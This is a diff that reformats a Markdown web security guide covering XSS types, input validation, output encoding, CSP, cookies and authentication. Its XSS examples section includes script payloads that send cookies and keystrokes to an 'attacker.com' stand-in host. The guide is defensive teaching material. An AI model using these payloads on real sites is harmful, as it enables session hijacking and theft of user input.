@@ -5,6 +5,7 @@ A comprehensive guide to web application security concepts and practices for TCS
 > **💡 Related Code**: See implementations in [`/src/core/utilities/validationUtils.ts`](../src/core/utilities/validationUtils.ts), [`/src/app.ts`](../src/app.ts), and [`/src/core/middleware/`](../src/core/middleware/)
 
 ## Quick Navigation
+
 - 🛡️ **Input Validation**: [`validationUtils.ts`](../src/core/utilities/validationUtils.ts) - Email, phone, and role validation functions
 - 🔒 **CORS Configuration**: [`app.ts`](../src/app.ts) - Cross-origin security setup
 - 📝 **Validation Middleware**: [`validation.ts`](../src/core/middleware/validation.ts) - Input validation security
@@ -40,16 +41,19 @@ Cross-Site Scripting (XSS) attacks occur when malicious scripts are injected int
 ### Types of XSS Attacks
 
 #### **STORED XSS (Most Dangerous)**
+
 - Malicious script is permanently stored on the server (database, file system)
 - Every user who views the affected page is attacked
 - **Example**: Malicious comment that steals cookies from all future readers
 
 #### **REFLECTED XSS**
+
 - Malicious script is reflected off the server (URL parameters, form submissions)
 - Only affects users who click a specially crafted malicious link
 - **Example**: Search page that displays unsanitized search terms
 
 #### **DOM-BASED XSS**
+
 - Attack occurs entirely in the browser via client-side JavaScript
 - Server is not involved in the vulnerability
 - **Example**: JavaScript that uses `location.hash` without sanitization
@@ -57,40 +61,49 @@ Cross-Site Scripting (XSS) attacks occur when malicious scripts are injected int
 ### XSS Attack Examples
 
 #### Simple Script Injection
+
 ```html
-<script>alert('XSS Attack!');</script>
+<script>
+    alert('XSS Attack!');
+</script>
 ```
 
 #### Cookie Theft
+
 ```html
 <script>
-document.location='http://attacker.com/steal.php?cookie='+document.cookie;
+    document.location =
+        'http://attacker.com/steal.php?cookie=' + document.cookie;
 </script>
 ```
 
 #### Session Hijacking
+
 ```html
 <script>
-new Image().src='http://attacker.com/log.php?sessionid='+document.cookie;
+    new Image().src =
+        'http://attacker.com/log.php?sessionid=' + document.cookie;
 </script>
 ```
 
 #### Keylogger
+
 ```html
 <script>
-document.onkeypress = function(e) {
-  // Send keystrokes to attacker server
-  fetch('http://attacker.com/log', {
-    method: 'POST',
-    body: JSON.stringify({key: e.key})
-  });
-};
+    document.onkeypress = function (e) {
+        // Send keystrokes to attacker server
+        fetch('http://attacker.com/log', {
+            method: 'POST',
+            body: JSON.stringify({ key: e.key }),
+        });
+    };
 </script>
 ```
 
 ### XSS Prevention Strategies
 
 #### **1. INPUT VALIDATION**
+
 - Validate all user input on the server side
 - Reject input containing script tags, JavaScript events, etc.
 - Use allowlists instead of blocklists when possible
@@ -110,46 +123,54 @@ export const isValidEmail = (email: string): boolean => {
 export const validateRegister = [
     body('email')
         .trim()
-        .notEmpty().withMessage('Email is required')
-        .isEmail().withMessage('Invalid email format')
+        .notEmpty()
+        .withMessage('Email is required')
+        .isEmail()
+        .withMessage('Invalid email format')
         .normalizeEmail(),
     body('username')
         .trim()
         .isLength({ min: 3, max: 50 })
         .matches(/^[a-zA-Z0-9_-]+$/)
-        .withMessage('Username can only contain letters, numbers, underscores, and hyphens'),
+        .withMessage(
+            'Username can only contain letters, numbers, underscores, and hyphens'
+        ),
     body('password')
         .notEmpty()
         .isLength({ min: 8, max: 128 })
         .withMessage('Password must be between 8 and 128 characters'),
-    handleValidationErrors
+    handleValidationErrors,
 ];
 ```
 
 #### **2. OUTPUT ENCODING/ESCAPING**
+
 - Encode special characters when displaying user content
 - Convert `<` to `&lt;`, `>` to `&gt;`, `"` to `&quot;`, etc.
 - Use context-appropriate encoding (HTML, JavaScript, CSS, URL)
 
 #### **3. CONTENT SECURITY POLICY (CSP)**
+
 - HTTP header that restricts resource loading and script execution
 - Prevents inline scripts and unauthorized external resources
 - **Example**: `Content-Security-Policy: script-src 'self'`
 
 #### **4. HTTP-ONLY COOKIES**
+
 - Mark cookies as HttpOnly to prevent JavaScript access
 - Reduces impact of XSS attacks on session hijacking
 
 ```javascript
 // Secure cookie setting
 res.cookie('sessionId', sessionId, {
-  httpOnly: true,
-  secure: true,
-  sameSite: 'strict'
+    httpOnly: true,
+    secure: true,
+    sameSite: 'strict',
 });
 ```
 
 #### **5. SECURE FRAMEWORKS**
+
 - Use frameworks that automatically escape output (React, Angular)
 - Avoid `innerHTML`, use `textContent` or framework-safe methods
 
@@ -217,12 +238,14 @@ const result = await pool.query(query, [email]);
 ### Client-Side vs Server-Side Validation
 
 #### **CLIENT-SIDE (Browser)**
+
 ✅ Immediate feedback to users
 ✅ Better user experience
 ❌ Can be bypassed or disabled
 ❌ Not secure on its own
 
 #### **SERVER-SIDE (Your API)**
+
 ✅ Secure and cannot be bypassed
 ✅ Authoritative validation
 ✅ Protects your database and business logic
@@ -235,27 +258,30 @@ const result = await pool.query(query, [email]);
 ## Authentication vs Authorization
 
 > **📖 Related Guides**:
+>
 > - [Password Security Guide](./password-security-guide.md) - Detailed password hashing and salt generation
 > - [JWT Implementation Guide](./jwt-implementation-guide.md) - Secure token-based authentication
 
 ### Authentication
+
 **"Who are you?"** - Verifying user identity
 
 ```typescript
 // Login endpoint
 app.post('/login', async (req, res) => {
-  const { username, password } = req.body;
-  const user = await verifyCredentials(username, password);
-  if (user) {
-    const token = generateJWT(user);
-    res.json({ token });
-  } else {
-    res.status(401).json({ error: 'Invalid credentials' });
-  }
+    const { username, password } = req.body;
+    const user = await verifyCredentials(username, password);
+    if (user) {
+        const token = generateJWT(user);
+        res.json({ token });
+    } else {
+        res.status(401).json({ error: 'Invalid credentials' });
+    }
 });
 ```
 
 ### Authorization
+
 **"What can you do?"** - Verifying user permissions
 
 > **📖 Related Guide**: See the [RBAC Guide](./rbac-guide.md) for detailed role-based access control implementation.
@@ -263,8 +289,8 @@ app.post('/login', async (req, res) => {
 ```typescript
 // Protected endpoint
 app.get('/admin', authenticateToken, authorizeAdmin, (req, res) => {
-  // Only authenticated admin users reach here
-  res.json({ adminData: 'sensitive information' });
+    // Only authenticated admin users reach here
+    res.json({ adminData: 'sensitive information' });
 });
 ```
 
@@ -276,11 +302,11 @@ app.get('/admin', authenticateToken, authorizeAdmin, (req, res) => {
 
 ```javascript
 res.cookie('sessionId', sessionId, {
-  httpOnly: true,    // Prevents JavaScript access
-  secure: true,      // HTTPS only
-  sameSite: 'strict', // CSRF protection
-  maxAge: 3600000,   // 1 hour expiration
-  path: '/'          // Cookie scope
+    httpOnly: true, // Prevents JavaScript access
+    secure: true, // HTTPS only
+    sameSite: 'strict', // CSRF protection
+    maxAge: 3600000, // 1 hour expiration
+    path: '/', // Cookie scope
 });
 ```
 
@@ -318,11 +344,11 @@ Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'; 
 
 ```typescript
 app.use((req, res, next) => {
-  res.setHeader(
-    'Content-Security-Policy',
-    "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'"
-  );
-  next();
+    res.setHeader(
+        'Content-Security-Policy',
+        "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'"
+    );
+    next();
 });
 ```
 
@@ -331,24 +357,28 @@ app.use((req, res, next) => {
 ## Security Checklist for Web Applications
 
 ### ✅ Input Security
+
 - [ ] All user input validated on server side
 - [ ] Parameterized queries used for database operations
 - [ ] Input sanitized before storage/display
 - [ ] File upload restrictions implemented
 
 ### ✅ Authentication & Sessions
+
 - [ ] Strong password requirements enforced
 - [ ] Session management implemented securely
 - [ ] Login attempts rate-limited
 - [ ] Secure logout functionality
 
 ### ✅ Data Protection
+
 - [ ] HTTPS enforced in production
 - [ ] Sensitive data encrypted at rest
 - [ ] Database credentials secured
 - [ ] API keys and secrets properly managed
 
 ### ✅ Headers & Policies
+
 - [ ] Security headers implemented (CSP, HSTS, etc.)
 - [ ] CORS configured appropriately
 - [ ] Error messages don't leak sensitive information
@@ -364,4 +394,4 @@ app.use((req, res, next) => {
 
 ---
 
-*This guide provides foundational security knowledge for web developers. Always stay updated with the latest security practices and vulnerabilities.*
+_This guide provides foundational security knowledge for web developers. Always stay updated with the latest security practices and vulnerabilities._
